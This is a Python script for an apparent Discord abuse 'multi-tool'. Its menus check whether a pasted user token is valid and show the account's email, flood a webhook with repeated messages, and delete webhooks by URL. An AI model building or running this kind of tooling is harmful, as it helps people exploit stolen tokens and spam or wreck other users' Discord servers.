import requests
import time
import os
import sys
from colorama import Fore, Style

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def slow_type(text, color=Fore.WHITE, speed=0.005):
    for char in text:
        sys.stdout.write(color + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def check_token():
    clear()
    slow_type("Enter Discord Token: ", Fore.WHITE, 0.002)
    token = input(Fore.WHITE + "")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    res = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    
    if res.status_code == 200:
        user_data = res.json()
        username = user_data.get("username", "Unknown")
        email = user_data.get("email", "No Email Found")
        slow_type(f"✔ Token is VALID.\nUser: {username}\nEmail: {email}", Fore.LIGHTGREEN_EX, 0.002)
    else:
        slow_type("❌ Token is INVALID. Try Again!", Fore.RED, 0.002)
    
    time.sleep(5)
    main_menu()

def webhook_info():
    clear()
    slow_type("Enter Webhook URL: ", Fore.WHITE, 0.002)
    webhook_url = input(Fore.WHITE + "")
    
    res = requests.get(webhook_url)
    if res.status_code == 200:
        data = res.json()
        guild_id = data.get("guild_id", "Unknown")
        channel_id = data.get("channel_id", "Unknown")
        slow_type(f"Webhook Info:\nServer ID: {guild_id}\nChannel ID: {channel_id}", Fore.LIGHTGREEN_EX, 0.002)
    else:
        slow_type("❌ Invalid Webhook URL. Try Again!", Fore.RED, 0.002)
    
    time.sleep(5)
    webhook_menu()

def delete_webhook():
    clear()
    slow_type("Enter Webhook URL: ", Fore.WHITE, 0.002)
    webhook_url = input(Fore.WHITE + "")
    
    res = requests.delete(webhook_url)
    if res.status_code in [200, 204]:
        slow_type("✔ Webhook Deleted Successfully!", Fore.LIGHTGREEN_EX, 0.002)
    else:
        slow_type("❌ Failed to Delete Webhook. Try Again!", Fore.RED, 0.002)
    
    time.sleep(3)
    webhook_menu()

def spam_webhook():
    clear()
    slow_type("Enter Webhook URL: ", Fore.WHITE, 0.002)
    webhook_url = input(Fore.WHITE + "")
    slow_type("Enter Message to Spam: ", Fore.WHITE, 0.002)
    message = input(Fore.WHITE + "")
    slow_type("Enter Amount of Messages: ", Fore.WHITE, 0.002)
    try:
        amount = int(input(Fore.WHITE + ""))
    except ValueError:
        slow_type("❌ Invalid Amount. Try Again!", Fore.RED, 0.002)
        time.sleep(2)
        spam_webhook()
    
    for _ in range(amount):
        requests.post(webhook_url, json={"content": message})
    slow_type("✔ Messages Sent!", Fore.LIGHTGREEN_EX, 0.002)
    time.sleep(3)
    webhook_menu()

def webhook_menu():
    clear()
    print(Fore.WHITE + """
     ______     _                   _      
    /_  __/____(_)   ______  ____  (_)  __
     / / / ___/ / | / / __ \/ __ \/ / |/_/
    / / / /  / /| |/ / /_/ / / / / />  <  
   /_/ /_/  /_/ |___/\____/_/ /_/_/_/|_|  
    """ + Style.RESET_ALL)
    
    print(Fore.WHITE + "            dev:@king0knight" + Style.RESET_ALL)
    print(Fore.WHITE + "            .gg/RZmJG9nXg5" + Style.RESET_ALL)
    
    print(Fore.WHITE + "\n<1> Webhook Info")
    print(Fore.WHITE + "<2> Spam Webhook")
    print(Fore.WHITE + "<3> Delete Webhook")
    print(Fore.WHITE + "<4> Return to Main Menu" + Style.RESET_ALL)
    
    slow_type("\n└ > ", Fore.WHITE, 0.002)
    choice = input(Fore.WHITE + "")
    
    if choice == "1":
        webhook_info()
    elif choice == "2":
        spam_webhook()
    elif choice == "3":
        delete_webhook()
    elif choice == "4":
        main_menu()
    else:
        slow_type("❌ Invalid choice. Try Again!", Fore.RED, 0.002)
        time.sleep(2)
        webhook_menu()

def main_menu():
    clear()
    print(Fore.WHITE + """
     ______     _                   _      
    /_  __/____(_)   ______  ____  (_)  __
     / / / ___/ / | / / __ \/ __ \/ / |/_/
    / / / /  / /| |/ / /_/ / / / / />  <  
   /_/ /_/  /_/ |___/\____/_/ /_/_/_/|_|  
    """ + Style.RESET_ALL)
    
    print(Fore.WHITE + "            dev:@king0knight" + Style.RESET_ALL)
    print(Fore.WHITE + "            .gg/RZmJG9nXg5" + Style.RESET_ALL)
    
    print(Fore.WHITE + "\n<1> Check Token")
    print(Fore.WHITE + "<2> Webhook Options")
    print(Fore.WHITE + "<3> Exit" + Style.RESET_ALL)
    
    slow_type("\n└ > ", Fore.WHITE, 0.002)
    choice = input(Fore.WHITE + "")
    
    if choice == "1":
        check_token()
    elif choice == "2":
        webhook_menu()
    elif choice == "3":
        slow_type("Exiting...", Fore.RED, 0.002)
        time.sleep(2)
        sys.exit()
    else:
        slow_type("❌ Invalid choice. Try Again!", Fore.RED, 0.002)
        time.sleep(2)
        main_menu()

if __name__ == "__main__":
    main_menu()
